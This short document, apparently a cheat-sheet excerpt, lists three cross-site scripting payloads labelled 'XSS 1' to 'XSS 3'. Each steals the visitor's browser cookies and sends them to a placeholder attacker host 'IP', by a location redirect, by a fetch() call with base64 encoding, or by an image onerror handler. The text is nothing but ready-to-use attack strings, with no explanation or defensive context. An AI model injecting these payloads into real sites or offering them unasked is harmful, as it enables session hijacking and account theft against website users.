```java title="XSS 1"
<script>document.location='http://IP:80/?c='+document.cookie;</script>
```

```java title="XSS 2"
<script>fetch("http://IP/?cookie="+btoa(document.cookie))</script>
```

```java title="XSS 3"
<img src=x onerror=this.src="http://IP/"+btoa(document.cookie)>
```
